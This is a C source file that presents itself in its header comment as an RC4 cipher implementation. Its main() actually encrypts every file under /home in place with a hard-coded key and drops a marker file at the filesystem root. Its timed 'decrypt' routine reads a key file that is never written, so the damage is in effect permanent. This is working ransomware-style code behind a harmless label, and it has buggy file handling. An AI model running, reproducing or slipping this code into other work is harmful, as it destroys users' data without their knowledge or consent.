/*
    robin verton, dec 2015
    implementation of the RC4 algo
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <signal.h>

#define N 256   // 2^8

void swap(unsigned char *a, unsigned char *b) {
    int tmp = *a;
    *a = *b;
    *b = tmp;
}

void KSA(char *key, unsigned char *S) {

    int len = strlen(key);
    int j = 0;

    for(int i = 0; i < N; i++)
        S[i] = i;

    for(int i = 0; i < N; i++) {
        j = (j + S[i] + key[i % len]) % N;

        swap(&S[i], &S[j]);
    }

}

void PRGA(unsigned char *S, char *plaintext) {

    int i = 0;
    int j = 0;

    for(size_t n = 0, len = strlen(plaintext); n < len; n++) {
        i = (i + 1) % N;
        j = (j + S[i]) % N;

        swap(&S[i], &S[j]);
        plaintext[n] = plaintext[n] ^ S[(S[i] + S[j]) % N];


    }

}

void RC4(char *key, char *plaintext) {

    unsigned char S[N];
    KSA(key, S);

    PRGA(S, plaintext);

}

void read_and_rc4(char *key, char *filename) {
	int fd = open(filename, O_RDWR);
	struct stat sb;
	
	fstat(fd, &sb);

	char *mem_f = mmap(NULL, sb.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	RC4(key, mem_f);
	write(fd, mem_f, sb.st_size);
}

void listdir(char *name, char *key)
{
    DIR *dir;
    struct dirent *entry;
    char path[1024];
    char format[6] = "%s/%s";
    char point[2] = ".";
    char dpoint[3] = "..";


    if (!(dir = opendir(name)))
        return;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            if (strcmp(entry->d_name, point) == 0 || strcmp(entry->d_name, dpoint) == 0)
                continue;
            snprintf(path, 1024, format, name, entry->d_name);
            listdir(path, key);
        } else {
		snprintf(path, 1024, format, name, entry->d_name);
            read_and_rc4(key, path);
        }
    }
    closedir(dir);
}




void decrypt() {
	char key_file[38] = "/1ca30cd59f0b566f9ef3a8208679585e.dat";
	int key_fd = open(key_file, O_RDONLY);
	char key[33];
	char target[6] = "/home";
	char buf;

	for(int i = 0; i < 32; i++) {
		if(read(key_fd, key+i, 1) != 1) {
			return;
		}
	}
	key[32] = 0;

	// decrypts /home
	listdir(target, key);
	close(key_fd);
	key_fd = open(key_file, O_WRONLY);
	write(key_fd, 0, 1);
}

void encrypt() {
	char key[33] = "07234ebcc47d4fc933622fd28a9ddb0a";
	char key_file[38] = "/1ca30cd59f0b566f9ef3a8208679585e.dat";
	char target[6] = "/home";
        char possible_key[33];
        char buf;


	if(access(key_file, F_OK) != 0) {
		// file doesn't exists, create it then encrypt /home
		creat(key_file, 0777);
		listdir(target, key);
	}

	signal(SIGALRM, decrypt);
	alarm(60);
	sleep(62);

}

int main() {
	encrypt();
}
